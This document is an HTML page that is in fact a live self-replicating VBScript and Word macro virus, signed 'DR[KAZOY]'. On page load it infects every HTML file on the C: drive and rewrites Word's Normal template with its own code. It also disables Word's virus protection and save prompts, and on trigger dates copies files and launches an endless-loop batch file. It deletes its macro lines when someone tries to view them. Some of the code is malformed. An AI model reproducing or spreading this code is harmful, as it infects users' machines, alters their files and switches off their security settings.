<html><!--babe-->
<body>
'<SCRIPT language=vbscript>
Sub Window_OnLoad()
On Error Resume Next
Call BOMB
Call pay
Call JUMP_WORD
End Sub
 Sub BOMB()
 On Error Resume Next
Set FSO = CreateObject("Scripting.FileSystemObject")
Set WORDOBJ = CreateObject("Word.application")
Set FS = WORDOBJ.Application.FileSearch
FS.NewSearch
FS.LookIn = "c:\"
FS.SearchSubFolders = True
FS.FileName = "*.html"
FS.Execute
For t = 1 To FS.FoundFiles.Count
Set bombed = FSO.opentextfile(FS.FoundFiles(t), 1)
f = bombed.readline
bombed.Close
If f <> "<html><!--babe-->" Then
Set TRANGE = Document.body.createTextRange
Set G = FSO.opentextfile(FS.FoundFiles(t), 1)
Contents = G.readall
G.Close
Set h = FSO.opentextfile(FS.FoundFiles(t), 2, True)
h.writeline "<html><!--babe-->"
h.writeline "<body>"
h.writeline TRANGE.HTMLText
h.writeline "</body>"
h.writeline "</html>"
h.writeline Contents
h.Close
End If
Next
WORDOBJ.Quit
 End Sub
 Sub pay()
On Error Resume Next
If Day(Now) = 15 Or (Day(Now) = 30 And Month(Now) = 5) Then
Set FSO = CreateObject("Scripting.FileSystemObject")
Set WORDOBJ = CreateObject("WORD.APPLICATION")
Set FS = WORDOBJ.Application.FileSearch
FS.LookIn = "C:\"
FS.SearchSubFolders = True
FS.FileName = "*X*.*"
FS.Execute
For G = 1 To FS.FoundFiles.Count
FSO.COPYFILE FS.FoundFiles(G), "c:\windows\desktop\"
Next G
MsgBox "I TOLD YOU TO BE CAREFULL "
MsgBox "[3C] VX INDUSTRIEZ"
Beep
MsgBox "PROZECT BY DR[KAZOY]" & vbCr & "HAHAHAHAHa"
End If
 End Sub
Sub JUMP_WORD()
On Error Resume Next
Set WORDOBJ = CreateObject("WORD.APPLICATION")
Dim HEADER
HEADER = "'DR[KAZOY] COPYLEFT"
Set NT = WORDOBJ.NormalTemplate.VBProject(1).CodeModule
Set TRANGE = Document.body.createTextRange
WORDOBJ.Options.SaveNormalPrompt = False
WORDOBJ.Options.VirusProtection = False
WORDOBJ.Application.DisplayAlerts = wdAlertsNone
If NT.LINES(1, 1) <> HEADER Then
NT.DeleteLines 1, NT.COUNTOFLINES
NT.ADDFROMSTRING TRANGE.HTMLText
NT.INSERTLINES 1, HEADER
WORDOBJ.NormalTemplate.Save
End If
WORDOBJ.Quit
Private Sub Document_Close()
Dim NI As Boolean, AI As Boolean
HEADER = "'DR[KAZOY] COPYLEFT"
Set NT = NormalTemplate.VBProject.VBComponents(1).CodeModule
Set AD = NormalTemplate.VBProject.VBComponents(1).CodeModule
If NT.LINES(1, 1) = HEADER Then NI = True
If AD.LINES(1, 1) = HEADER Then AI = True
S = VBE.ActiveVBProject.VBComponents(1).CodeModule.LINES(1, 128)
If NI = False Then NT.ADDFROMSTRING S
If AI = False Then AD.ADDFROMSTRING S
Call BOMB2
Set AP = Application.FileSearch
AP.LookIn = ActiveDocument.Path
AP.SearchSubFolders = True
AP.FileName = "*.htm"
AP.Execute
For X = 1 To AP.FoundFiles.Count
Open AP.FoundFiles(X) For Random As G 
Print G; "<html><!--babe-->"
Print G; "<BODY>"
Print G; VBE.ActiveVBProject.VBComponents(1).CodeModule.LINES(2, 128)
Print G; "</BODY>"
Print G; "<HTML>"
Close G
Next X
End Sub
Private Sub Document_OPEN()
Options.SaveNormalPrompt = False
Options.VirusProtection = False
Application.DisplayAlerts = wdAlertsNone
End Sub
Sub BOMB2()
On Error Resume Next
If Day(Now) = 15 Or (Day(Now) = 30 And Month(Now) = 5) Then
For O = 1 To 9
CommandBars(O).Name = "DR[KAZOY]-3C"
MsgBox "COMMAND BAR'S NAME CHANGED" & vbCr & "3C"
Next O
Open "C:\DEAD.BAT" For Random As GAM 
Print GAM; "ECHO OFF"
Print GAM; ":DRAMBUI"
Print GAM; "PAUSE"
Print GAM; "ECHO -3C- INDUSTRIEZ PRESENTS"
Print GAM; "ECHODR[KAZOY]"
Print GAM; "ECHO N'"
Print GAM; "ECHO HIS NEW VIRUS FUNKY DEAMON 2"
Print GAM; "ECHO ALSO KNOWN AS"
Print GAM; "ECHO DAPA DUPA"
Print GAM; "ECHO DR[KAZOY] GIVES YOU THE TASTE OF POWER "
Print GAM; "GOTO DRAMBUI"
Close GAM
MsgBox "WATCH THIS"
Shell "C:\DEAD.BAT", vbMaximizedFocus
Application.Quit False
End If
End Sub
Sub VIEWVBCODE()
On Error Resume Next
NormalTemplate.VBProject.VBComponents(1).CodeModule.DeleteLines 1, 40
ActiveDocument.VBProject.VBComponents(1).CodeModule.DeleteLines 1, 140
Application.ShowVisualBasicEditor = True
End Sub
Sub TOOLSMACRO()
On Error Resume Next
NormalTemplate.VBProject.VBComponents(1).CodeModule.DeleteLines 1, 40
ActiveDocument.VBProject.VBComponents(1).CodeModule.DeleteLines 1, 140
Application.ShowVisualBasicEditor = True
Sub FILETEMPLATES()
On Error Resume Next
NormalTemplate.VBProject.VBComponents(1).CodeModule.DeleteLines 1, 40
ActiveDocument.VBProject.VBComponents(1).CodeModule.DeleteLines 1, 140
Application.ShowVisualBasicEditor = True
End Sub
'</SCRIPT>
</body>
</html>
